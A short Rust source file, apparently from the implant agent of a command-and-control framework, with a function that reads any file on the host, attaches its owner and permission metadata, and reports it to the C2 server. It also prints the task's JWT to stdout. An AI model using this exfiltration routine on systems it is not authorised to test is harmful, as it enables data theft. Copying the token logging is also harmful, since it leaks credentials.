use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use pb::c2::TaskContext;
use pb::{c2, eldritch};

pub fn file(agent: Arc<dyn Agent>, task_context: TaskContext, path: String) -> Result<(), String> {
    use eldritch_libfile::std::metadata;

    let content = std::fs::read(&path).map_err(|e| e.to_string())?;
    let meta = metadata::get_metadata(std::path::Path::new(&path)).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        permissions: meta.permissions,
        owner: meta.owner,
        group: meta.group,
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    println!("reporting file chunk with JWT: {}", task_context.jwt);
    let req = c2::ReportFileRequest {
        context: Some(task_context),
        chunk: Some(file_msg),
    };

    agent.report_file(req).map(|_| ())
}
